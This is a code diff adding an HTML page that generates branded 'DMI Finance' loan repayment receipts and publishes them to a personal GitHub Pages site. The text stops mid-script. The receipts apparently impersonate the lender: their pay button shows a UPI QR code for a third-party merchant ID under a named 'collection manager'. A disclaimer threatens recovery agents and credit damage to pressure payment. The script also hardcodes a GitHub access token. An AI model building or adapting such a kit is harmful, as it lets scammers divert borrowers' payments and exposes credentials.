@@ -1,0 +1,1541 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DMI Finance - Receipt Generator</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700;800&family=Titillium+Web:wght@600;700&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    body {
+      background: linear-gradient(160deg, #1644c9 0%, #2457F5 55%, #1d4ed8 100%);
+      min-height: 100vh;
+      color: #0f172a;
+    }
+    .all-caps-input {
+      text-transform: uppercase;
+    }
+  </style>
+</head>
+<body class="py-6 px-4 sm:py-10">
+  <div class="max-w-xl mx-auto space-y-5">
+    <!-- Header Card -->
+    <header class="bg-white rounded-2xl p-5 shadow-lg flex items-center justify-between gap-4">
+      <div class="flex items-center gap-3 min-w-0">
+        <img
+          src="https://www.dmifinance.in/wp-content/uploads/2026/05/Logo-final-RGB.svg"
+          alt="DMI Finance"
+          class="h-9 w-auto object-contain shrink-0"
+          onerror="this.onerror=null; this.src='https://placehold.co/150x36/ffffff/0B3B9C?text=DMI+FINANCE';"
+        />
+        <div class="min-w-0">
+          <h1 class="text-base sm:text-lg font-extrabold text-slate-900 tracking-tight truncate">
+            RECEIPT GENERATOR
+          </h1>
+          <p class="text-xs font-medium text-slate-500 truncate">
+            Saves to <span class="font-semibold text-slate-700">adnan369/dmifinance/loan/&lt;name&gt;.html</span>
+          </p>
+        </div>
+      </div>
+      <span class="px-2.5 py-1 rounded-full text-[11px] font-bold bg-blue-50 text-blue-700 border border-blue-200 shrink-0">
+        AUTO PUSH
+      </span>
+    </header>
+
+    <!-- Main Form Card -->
+    <main class="bg-white rounded-3xl p-5 sm:p-7 shadow-xl space-y-5">
+      <!-- Feedback Message Box (No alert/confirm) -->
+      <div id="statusBox" class="hidden rounded-2xl p-4 text-sm font-medium border"></div>
+
+      <!-- 5 Customer Receipt Details Form -->
+      <form id="receiptForm" class="space-y-4" novalidate>
+        <!-- 1. Account Holder Name -->
+        <div>
+          <label for="holderName" class="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-1.5">
+            1. Account Holder Name
+          </label>
+          <input
+            id="holderName"
+            type="text"
+            required
+            placeholder="e.g. Adnan Ibrahim"
+            class="all-caps-input w-full rounded-xl border border-slate-300 bg-slate-50 px-3.5 py-2.5 text-sm font-bold text-slate-900 focus:bg-white focus:border-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500/20"
+          />
+          <p class="mt-1 text-[11px] text-slate-500">
+            Saved in ALL CAPS on receipt; file name uses lowercase first name: <span id="fileNamePreview" class="font-bold text-blue-700">loan/adnan.html</span>
+          </p>
+        </div>
+
+        <!-- 2. Loan ID (DMI + 10 numeric digits) -->
+        <div>
+          <label for="loanId" class="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-1.5">
+            2. Loan ID (DMI + 10 Digits)
+          </label>
+          <input
+            id="loanId"
+            type="text"
+            required
+            maxlength="13"
+            placeholder="e.g. DMI0089202812 or 10 digits"
+            class="all-caps-input w-full rounded-xl border border-slate-300 bg-slate-50 px-3.5 py-2.5 text-sm font-bold text-slate-900 tracking-wide focus:bg-white focus:border-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500/20"
+          />
+          <p class="mt-1 text-[11px] text-slate-500">
+            Must start with <span class="font-bold text-slate-700">DMI</span> followed by exactly <span class="font-bold text-slate-700">10 numeric digits</span>.
+          </p>
+        </div>
+
+        <!-- 3. Bill Status -->
+        <div>
+          <label for="billStatus" class="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-1.5">
+            3. Bill Status
+          </label>
+          <select
+            id="billStatus"
+            required
+            class="w-full rounded-xl border border-slate-300 bg-slate-50 px-3.5 py-2.5 text-sm font-bold uppercase text-slate-900 focus:bg-white focus:border-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500/20"
+          >
+            <option value="PART PAYMENT">PART PAYMENT</option>
+            <option value="PARTIAL PAYMENT" selected>PARTIAL PAYMENT</option>
+            <option value="FORECLOSE">FORECLOSE</option>
+            <option value="SETTLEMENT">SETTLEMENT</option>
+            <option value="SETTLEMENT TOKEN">SETTLEMENT TOKEN</option>
+            <option value="FULL PAYMENT">FULL PAYMENT</option>
+          </select>
+        </div>
+
+        <!-- 4. Bill Date (DD MMMM YYYY) -->
+        <div>
+          <div class="flex items-center justify-between mb-1.5">
+            <label for="billDate" class="block text-xs font-bold uppercase tracking-wider text-slate-600">
+              4. Bill Date (DD MMMM YYYY)
+            </label>
+            <button
+              type="button"
+              id="useTodayBtn"
+              class="text-[11px] font-bold text-blue-600 hover:text-blue-800 underline cursor-pointer"
+            >
+              Use Today's Date
+            </button>
+          </div>
+          <input
+            id="billDate"
+            type="text"
+            placeholder="Leave empty or enter day / DD MMMM YYYY"
+            class="all-caps-input w-full rounded-xl border border-slate-300 bg-slate-50 px-3.5 py-2.5 text-sm font-bold text-slate-900 focus:bg-white focus:border-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500/20"
+          />
+          <p class="mt-1 text-[11px] text-slate-500">
+            Example: <span class="font-bold text-slate-700">30 NOVEMBER 2026</span>. Blank or day-only uses today's date automatically.
+          </p>
+        </div>
+
+        <!-- 5. Bill Amount -->
+        <div>
+          <label for="billAmount" class="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-1.5">
+            5. Bill Amount (INR)
+          </label>
+          <input
+            id="billAmount"
+            type="text"
+            required
+            placeholder="e.g. 2500 or 2,500.00"
+            class="w-full rounded-xl border border-slate-300 bg-slate-50 px-3.5 py-2.5 text-sm font-bold text-slate-900 focus:bg-white focus:border-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500/20"
+          />
+          <p class="mt-1 text-[11px] text-slate-500">
+            Synced to both receipt display (<span class="font-bold text-slate-700">INR X,XXX.XX</span>) and UPI payment link/QR amount.
+          </p>
+        </div>
+
+        <!-- Submit Button -->
+        <button
+          type="submit"
+          id="generateBtn"
+          class="w-full rounded-2xl bg-[#1754D8] hover:bg-[#1143B5] active:scale-[0.99] text-white font-extrabold text-sm sm:text-base tracking-wide uppercase py-3.5 px-5 shadow-lg shadow-blue-900/20 transition cursor-pointer"
+        >
+          Generate &amp; Save HTML to GitHub
+        </button>
+      </form>
+
+      <!-- Generated Output Card -->
+      <div id="resultCard" class="hidden rounded-2xl border border-emerald-200 bg-emerald-50 p-4 space-y-3">
+        <div class="flex items-center justify-between gap-2">
+          <span class="text-xs font-extrabold uppercase tracking-wider text-emerald-800">
+            Receipt Saved Successfully
+          </span>
+          <span id="savedPathBadge" class="text-xs font-bold text-emerald-700 bg-white px-2.5 py-0.5 rounded-full border border-emerald-200"></span>
+        </div>
+        <div>
+          <label class="block text-[11px] font-bold uppercase text-emerald-900 mb-1">
+            Shareable Customer Link
+          </label>
+          <input
+            id="shareableLinkInput"
+            type="text"
+            readonly
+            class="w-full rounded-xl border border-emerald-300 bg-white px-3 py-2 text-xs font-semibold text-slate-800"
+          />
+        </div>
+        <div class="flex flex-wrap gap-2">
+          <button
+            type="button"
+            id="copyLinkBtn"
+            class="flex-1 min-w-[130px] rounded-xl bg-emerald-700 hover:bg-emerald-800 text-white font-bold text-xs py-2.5 px-3 cursor-pointer"
+          >
+            Copy Link
+          </button>
+          <a
+            id="openReceiptLink"
+            href="#"
+            target="_blank"
+            rel="noopener noreferrer"
+            class="flex-1 min-w-[130px] text-center rounded-xl bg-white hover:bg-emerald-100 text-emerald-800 border border-emerald-300 font-bold text-xs py-2.5 px-3"
+          >
+            Open Receipt Page
+          </a>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <script>
+    // Fixed Repository & Folder Configuration
+    const REPO_OWNER = 'adnan369';
+    const REPO_NAME = 'dmifinance';
+    const TARGET_FOLDER = 'loan';
+    const LIVE_SITE_BASE = `https://${REPO_OWNER}.github.io/${REPO_NAME}/`;
+    const FIXED_GITHUB_TOKEN = 'Github_pat_11ALGPPDY0j75ExrWKCbE5_CwkYCIZXI8X2zpay79FQS3N3nvM5HRH3SayaKzncVu3LTXQE6QM2z4pTmuE';
+
+    // Fixed Merchant & Contact Details
+    const MERCHANT_UPI_ID = 'BHARATPE09917548991@yesbankltd';
+    const MERCHANT_PAYEE_NAME = 'DMI Finance';
+    const MERCHANT_TRANSACTION_NOTE = 'DMI Finance';
+    const COLLECTION_MANAGER_NAME = 'MD ADNAN';
+    const ICON_BASE_URL = 'https://adnan369.github.io/dmifinance/brand/';
+
+    const MONTH_NAMES = [
+      'JANUARY', 'FEBRUARY', 'MARCH', 'APRIL', 'MAY', 'JUNE',
+      'JULY', 'AUGUST', 'SEPTEMBER', 'OCTOBER', 'NOVEMBER', 'DECEMBER'
+    ];
+
+    const VALID_STATUSES = [
+      'PART PAYMENT',
+      'PARTIAL PAYMENT',
+      'FORECLOSE',
+      'SETTLEMENT',
+      'SETTLEMENT TOKEN',
+      'FULL PAYMENT'
+    ];
+
+    /**
+     * Display status banner inside the generator card
+     */
+    function showStatus(message, type = 'info') {
+      const box = document.getElementById('statusBox');
+      if (!box) return;
+      box.classList.remove('hidden', 'bg-rose-50', 'border-rose-200', 'text-rose-800', 'bg-emerald-50', 'border-emerald-200', 'text-emerald-800', 'bg-blue-50', 'border-blue-200', 'text-blue-800');
+      if (type === 'error') {
+        box.classList.add('bg-rose-50', 'border-rose-200', 'text-rose-800');
+      } else if (type === 'success') {
+        box.classList.add('bg-emerald-50', 'border-emerald-200', 'text-emerald-800');
+      } else {
+        box.classList.add('bg-blue-50', 'border-blue-200', 'text-blue-800');
+      }
+      box.textContent = message;
+    }
+
+    function hideStatus() {
+      const box = document.getElementById('statusBox');
+      if (box) box.classList.add('hidden');
+    }
+
+    /**
+     * Format current date as "DD MMMM YYYY" in uppercase
+     */
+    function getTodayFormattedDate() {
+      const now = new Date();
+      const day = String(now.getDate()).padStart(2, '0');
+      const month = MONTH_NAMES[now.getMonth()];
+      const year = now.getFullYear();
+      return `${day} ${month} ${year}`;
+    }
+
+    /**
+     * Normalize and validate Bill Date into "DD MMMM YYYY" (ALL CAPS).
+     * If empty or only day number is provided, uses today's date.
+     */
+    function normalizeBillDate(rawInput) {
+      const trimmed = String(rawInput || '').trim().toUpperCase();
+      const todayFormatted = getTodayFormattedDate();
+
+      if (!trimmed) {
+        return todayFormatted;
+      }
+
+      // If user only entered a day number (e.g., "25" or "5"), use current month & year
+      const dayOnlyMatch = trimmed.match(/^(\d{1,2})$/);
+      if (dayOnlyMatch) {
+        const dayNum = parseInt(dayOnlyMatch[1], 10);
+        if (dayNum >= 1 && dayNum <= 31) {
+          const now = new Date();
+          return `${String(dayNum).padStart(2, '0')} ${MONTH_NAMES[now.getMonth()]} ${now.getFullYear()}`;
+        }
+        return todayFormatted;
+      }
+
+      // Match "DD MONTH YYYY" (full or prefix month name)
+      const parts = trimmed.split(/\s+/);
+      if (parts.length >= 3) {
+        const dayNum = parseInt(parts[0].replace(/\D/g, ''), 10);
+        const monthToken = parts[1].replace(/[^A-Z]/g, '');
+        const yearNum = parseInt(parts[2].replace(/\D/g, ''), 10);
+
+        const matchedMonth = MONTH_NAMES.find((m) => m === monthToken || m.startsWith(monthToken));
+        if (dayNum >= 1 && dayNum <= 31 && matchedMonth && yearNum >= 1900 && yearNum <= 2100) {
+          return `${String(dayNum).padStart(2, '0')} ${matchedMonth} ${yearNum}`;
+        }
+      }
+
+      // Fallback parse with Date constructor
+      const parsed = new Date(trimmed);
+      if (!Number.isNaN(parsed.getTime())) {
+        const day = String(parsed.getDate()).padStart(2, '0');
+        const month = MONTH_NAMES[parsed.getMonth()];
+        const year = parsed.getFullYear();
+        return `${day} ${month} ${year}`;
+      }
+
+      return null;
+    }
+
+    /**
+     * Validate and normalize Loan ID to "DMI" + 10 numeric digits (13 chars total).
+     * Accepts "DMI0089202812" or 10 digits and prepends "DMI".
+     */
+    function normalizeLoanId(rawLoan) {
+      let cleaned = String(rawLoan || '').trim().toUpperCase().replace(/\s+/g, '');
+      if (/^\d{10}$/.test(cleaned)) {
+        cleaned = 'DMI' + cleaned;
+      }
+      if (/^DMI\d{10}$/.test(cleaned)) {
+        return cleaned;
+      }
+      return null;
+    }
+
+    /**
+     * Extract lowercase first name for file path: loan/<firstname>.html
+     */
+    function getFirstNameSlug(fullNameUpper) {
+      const firstToken = String(fullNameUpper || '').trim().split(/\s+/)[0] || 'customer';
+      const slug = firstToken.toLowerCase().replace(/[^a-z0-9]/g, '');
+      return slug || 'customer';
+    }
+
+    /**
+     * Format bill amount into "INR X,XXX.XX" and raw numeric "XXXX.XX"
+     */
+    function parseBillAmount(rawAmount) {
+      const cleaned = String(rawAmount || '').replace(/,/g, '').trim();
+      const match = cleaned.match(/\d+(?:\.\d+)?/);
+      if (!match) return null;
+      const numeric = parseFloat(match[0]);
+      if (Number.isNaN(numeric) || numeric <= 0) return null;
+      const formattedDisplay = 'INR ' + numeric.toLocaleString('en-IN', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+      return {
+        numericFixed: numeric.toFixed(2),
+        formattedDisplay
+      };
+    }
+
+    /**
+     * Escape HTML special characters safely
+     */
+    function escapeHtml(str) {
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+    }
+
+    /**
+     * Build standalone receipt HTML with exact customer values and fixed UPI/note/manager settings
+     */
+    function buildReceiptHtml({ holderName, loanId, billStatus, billDate, formattedAmount, numericAmount }) {
+      const safeName = escapeHtml(holderName);
+      const safeLoan = escapeHtml(loanId);
+      const safeStatus = escapeHtml(billStatus);
+      const safeDate = escapeHtml(billDate);
+      const safeAmount = escapeHtml(formattedAmount);
+      const safeNumericAmount = escapeHtml(numericAmount);
+
+      return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DMI Finance - Repayment Receipt</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Titillium Web', sans-serif;
+    }
+
+    body {
+      background-color: #2457F5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      color: #111827;
+      padding-bottom: 28px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .mobile-container {
+      width: 100%;
+      max-width: 440px;
+      padding: 0 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 22px;
+    }
+
+    .top-header {
+      background-color: #FFFFFF;
+      border-bottom-left-radius: 16px;
+      border-bottom-right-radius: 16px;
+      padding: 22px 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+    }
+
+    .logo-box {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .top-brand-logo {
+      height: 52px;
+      width: auto;
+      max-width: 240px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .receipt-card {
+      background-color: #FFFFFF;
+      border-radius: 16px;
+      padding: 28px 24px 22px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+    }
+
+    .receipt-title {
+      font-size: 17px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      color: #0F172A;
+      margin-bottom: 22px;
+      text-transform: uppercase;
+    }
+
+    .detail-list {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .detail-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+    }
+
+    .icon-wrap {
+      width: 26px;
+      height: 26px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 2px;
+      flex-shrink: 0;
+    }
+
+    .receipt-icon-img {
+      width: 24px;
+      height: 24px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .detail-content {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .detail-label {
+      font-size: 9.5px;
+      font-weight: 600;
+      color: #6B7280;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      margin-bottom: 1px;
+    }
+
+    .detail-value {
+      font-size: 15.5px;
+      font-weight: 700;
+      color: #0F172A;
+      letter-spacing: 0.25px;
+      line-height: 1.2;
+      text-transform: uppercase;
+    }
+
+    .green-underline {
+      width: 38px;
+      height: 4px;
+      background-color: #00C853;
+      border-radius: 4px;
+      margin-top: 4px;
+    }
+
+    .contact-section {
+      margin-top: 28px;
+      padding-left: 8px;
+      font-size: 11.5px;
+      color: #1F2937;
+    }
+
+    .contact-heading {
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+
+    .contact-heading strong {
+      font-weight: 700;
+    }
+
+    .contact-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+      font-weight: 700;
+      font-size: 11.5px;
+      color: #111827;
+    }
+
+    .contact-link {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      text-decoration: none;
+      color: #111827;
+    }
+
+    .contact-icon-img {
+      width: 15px;
+      height: 15px;
+      object-fit: contain;
+      display: block;
+      flex-shrink: 0;
+    }
+
+    .pay-btn {
+      width: 100%;
+      background-color: #1754D8;
+      color: #FFFFFF;
+      border: 2.5px solid #FFFFFF;
+      border-radius: 14px;
+      padding: 18px 16px;
+      font-size: 19px;
+      font-weight: 700;
+      letter-spacing: 0.9px;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
+      transition: transform 0.15s ease, background-color 0.15s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      line-height: 1.2;
+    }
+
+    .pay-btn:active {
+      transform: scale(0.98);
+      background-color: #1143B5;
+    }
+
+    .disclaimer-card {
+      background-color: #FFFFFF;
+      border-radius: 16px;
+      padding: 20px 18px 16px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+    }
+
+    .disclaimer-text {
+      font-size: 12px;
+      line-height: 1.48;
+      color: #1F2937;
+      text-align: justify;
+      margin-bottom: 18px;
+      font-weight: 600;
+    }
+
+    .disclaimer-text strong {
+      font-weight: 700;
+      color: #000000;
+    }
+
+    .footer-logos {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-top: 4px;
+      gap: 8px;
+    }
+
+    .mini-dmi {
+      display: flex;
+      align-items: center;
+      flex-shrink: 0;
+    }
+
+    .footer-brand-logo {
+      height: 20px;
+      width: auto;
+      max-width: 115px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .payment-partners {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .bharatpe-text {
+      font-size: 10.5px;
+      font-weight: 700;
+      color: #1E293B;
+      display: flex;
+      align-items: center;
+      gap: 2px;
+    }
+
+    .bharatpe-text span {
+      color: #00B9F1;
+    }
+
+    .rupay-text {
+      font-size: 11.5px;
+      font-weight: 700;
+      font-style: italic;
+      color: #1D3B8B;
+      letter-spacing: -0.3px;
+    }
+
+    .rupay-arrow {
+      color: #F37021;
+    }
+
+    .visa-text {
+      font-size: 12.5px;
+      font-weight: 700;
+      font-style: italic;
+      color: #1A1F71;
+      letter-spacing: -0.5px;
+    }
+
+    .mc-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .mc-circles {
+      display: flex;
+      align-items: center;
+    }
+
+    .mc-red {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #EB001B;
+    }
+
+    .mc-orange {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #F79E1B;
+      margin-left: -5px;
+      opacity: 0.9;
+    }
+
+    .mc-label {
+      font-size: 5px;
+      font-weight: 700;
+      color: #374151;
+      margin-top: 1px;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background-color: rgba(15, 23, 42, 0.65);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 1000;
+      backdrop-filter: blur(2px);
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    @keyframes popIn {
+      from { transform: scale(0.92); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .qr-modal-box {
+      background-color: #FFFFFF;
+      width: 100%;
+      max-width: 390px;
+      border-radius: 16px;
+      padding: 24px 22px 20px;
+      text-align: center;
+      box-shadow: 0 22px 44px rgba(0, 0, 0, 0.28);
+      animation: popIn 0.2s ease-out;
+    }
+
+    .qr-top-meta {
+      background-color: #F8FAFC;
+      border: 1px solid #E2E8F0;
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      text-align: left;
+    }
+
+    .qr-customer-name {
+      font-size: 16px;
+      font-weight: 700;
+      color: #0F172A;
+      letter-spacing: 0.3px;
+      line-height: 1.25;
+      text-transform: uppercase;
+    }
+
+    .qr-loan-id {
+      font-size: 12.5px;
+      font-weight: 600;
+      color: #475569;
+      margin-top: 3px;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+    }
+
+    .qr-code-frame {
+      width: 212px;
+      height: 212px;
+      margin: 0 auto 16px;
+      padding: 10px;
+      background-color: #FFFFFF;
+      border: 2px solid #E2E8F0;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .qr-code-frame svg {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    .qr-amount-bold {
+      font-size: 28px;
+      font-weight: 700;
+      color: #0F172A;
+      line-height: 1.15;
+      letter-spacing: 0.3px;
+    }
+
+    .qr-manager-caption {
+      font-size: 13px;
+      font-weight: 600;
+      color: #334155;
+      margin-top: 6px;
+      margin-bottom: 18px;
+      line-height: 1.35;
+    }
+
+    .qr-actions-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .qr-btn-close {
+      width: 100%;
+      background-color: #1754D8;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 12px;
+      padding: 11px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="mobile-container">
+    <header class="top-header">
+      <div class="logo-box">
+        <img
+          src="https://www.dmifinance.in/wp-content/uploads/2026/05/Logo-final-RGB.svg"
+          alt="DMI Finance"
+          class="top-brand-logo"
+          onerror="this.onerror=null; this.src='https://placehold.co/210x52/ffffff/0B3B9C?text=DMI+FINANCE';"
+        />
+      </div>
+    </header>
+
+    <main class="receipt-card">
+      <h1 class="receipt-title">REPAYMENT RECEIPT</h1>
+      <div class="detail-list">
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img id="icon-account-holder" src="${ICON_BASE_URL}holder.png" alt="Account Holder" class="receipt-icon-img" data-fallback="user" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">ACCOUNT HOLDER</span>
+            <span class="detail-value" id="holder-name">${safeName}</span>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img id="icon-loan-id" src="${ICON_BASE_URL}loan.png" alt="Loan ID" class="receipt-icon-img" data-fallback="loan" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">LOAN ID</span>
+            <span class="detail-value" id="loan-id">${safeLoan}</span>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img id="icon-bill-status" src="${ICON_BASE_URL}status.png" alt="Bill Status" class="receipt-icon-img" data-fallback="status" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">BILL STATUS</span>
+            <span class="detail-value" id="bill-status">${safeStatus}</span>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img id="icon-bill-date" src="${ICON_BASE_URL}date.png" alt="Bill Date" class="receipt-icon-img" data-fallback="date" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">BILL DATE</span>
+            <span class="detail-value" id="bill-date">${safeDate}</span>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img id="icon-bill-amount" src="${ICON_BASE_URL}amount.png" alt="Bill Amount" class="receipt-icon-img" data-fallback="amount" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">BILL AMOUNT</span>
+            <span class="detail-value" id="bill-amount">${safeAmount}</span>
+            <div class="green-underline"></div>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img id="icon-collection-manager" src="${ICON_BASE_URL}manager.png" alt="Collection Manager" class="receipt-icon-img" data-fallback="manager" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">COLLECTION MANAGER</span>
+            <span class="detail-value" id="manager-name">${COLLECTION_MANAGER_NAME}</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="contact-section">
+        <p class="contact-heading">For any queries, please contact <strong>DMI Finance</strong></p>
+        <div class="contact-row">
+          <a href="tel:+917669818769" class="contact-link">
+            <img src="${ICON_BASE_URL}chat.png" alt="Contact" class="contact-icon-img" onerror="this.style.display='none'" />
+            76698 18769
+          </a>
+          <a href="mailto:customercae@dmifinance.com" class="contact-link">
+            <img src="${ICON_BASE_URL}mail.png" alt="Email" class="contact-icon-img" onerror="this.style.display='none'" />
+            customercae@dmifinance.com
+          </a>
+        </div>
+      </div>
+    </main>
+
+    <button type="button" class="pay-btn" id="proceedPayBtn" onclick="openPaymentModal()">
+      PROCEED TO PAY
+    </button>
+
+    <footer class="disclaimer-card">
+      <p class="disclaimer-text">
+        <strong>DMI Finance</strong> loan account has been classified as a written-off case. Any payment you make will be reflected in your loan account within two to four weeks. To avoid a visit from recovery agents and a negative impact on your CIBIL score, please pay the full outstanding amount or close your loan at the earliest. For the exact outstanding amount and payment options, please contact DMI Finance through its official customer care channels.
+      </p>
+
+      <div class="footer-logos">
+        <div class="mini-dmi">
+          <img
+            src="https://www.dmifinance.in/wp-content/uploads/2026/05/Logo-final-RGB.svg"
+            alt="DMI Finance"
+            class="footer-brand-logo"
+            onerror="this.onerror=null; this.src='https://placehold.co/110x26/ffffff/0B3B9C?text=DMI+FINANCE';"
+          />
+        </div>
+
+        <div class="payment-partners">
+          <div class="bharatpe-text">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+              <circle cx="12" cy="12" r="10" stroke="#00B9F1" stroke-width="2.5"/>
+              <path d="M8 10h8M8 14h6" stroke="#1E293B" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+            Bharat<span>Pe</span>
+          </div>
+          <div class="rupay-text">RuPay<span class="rupay-arrow">&#9656;</span></div>
+          <div class="visa-text">VISA</div>
+          <div class="mc-wrap">
+            <div class="mc-circles">
+              <div class="mc-red"></div>
+              <div class="mc-orange"></div>
+            </div>
+            <span class="mc-label">mastercard</span>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <div class="modal-overlay" id="paymentModal" onclick="closePaymentModal(event)">
+    <div class="qr-modal-box" id="pcQrModalBox" onclick="event.stopPropagation()">
+      <div class="qr-top-meta">
+        <div class="qr-customer-name" id="qrCustomerName">${safeName}</div>
+        <div class="qr-loan-id" id="qrLoanId">LOAN ID: ${safeLoan}</div>
+      </div>
+      <div class="qr-code-frame" id="qrCodeContainer" aria-label="UPI QR Code"></div>
+      <div class="qr-amount-bold" id="qrAmountDisplay">${safeAmount}</div>
+      <div class="qr-manager-caption">Collection Manager Md Adnan From DMI Finance</div>
+      <div class="qr-actions-row">
+        <button type="button" class="qr-btn-close" onclick="closePaymentModal()">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const FIXED_UPI_AMOUNT = "${safeNumericAmount}";
+    const FIXED_DISPLAY_AMOUNT = "${safeAmount}";
+    const MERCHANT_UPI_ID = "${MERCHANT_UPI_ID}";
+    const MERCHANT_PAYEE_NAME = "${MERCHANT_PAYEE_NAME}";
+    const MERCHANT_TRANSACTION_NOTE = "${MERCHANT_TRANSACTION_NOTE}";
+
+    const FALLBACK_SVGS = {
+      user: '<svg width="20" height="20" viewBox="0 0 24 24" fill="#000000"><path d="M12 12c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm0 2c-3.33 0-10 1.67-10 5v2h20v-2c0-3.33-6.67-5-10-5z"/></svg>',
+      loan: '<svg width="20" height="20" viewBox="0 0 24 24" fill="#000000"><rect x="4" y="3" width="16" height="18" rx="4" fill="#000000"/><rect x="8" y="11" width="8" height="2.2" rx="1" fill="#FFFFFF"/></svg>',
+      status: '<svg width="20" height="20" viewBox="0 0 24 24" fill="#000000"><path d="M4 3v18l3-2 3 2 2-2 2 2 3-2 3 2V3l-3 2-3-2-2 2-2-2-3 2-3-2zm4 5h8v2H8V8zm0 4h8v2H8v-2zm0 4h5v2H8v-2z"/></svg>',
+      date: '<svg width="20" height="20" viewBox="0 0 24 24" fill="#000000"><path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11z"/><path d="M12.5 11.5h-2v1.5h1v3.5h-1v1.5h3.5v-1.5h-1v-5z"/></svg>',
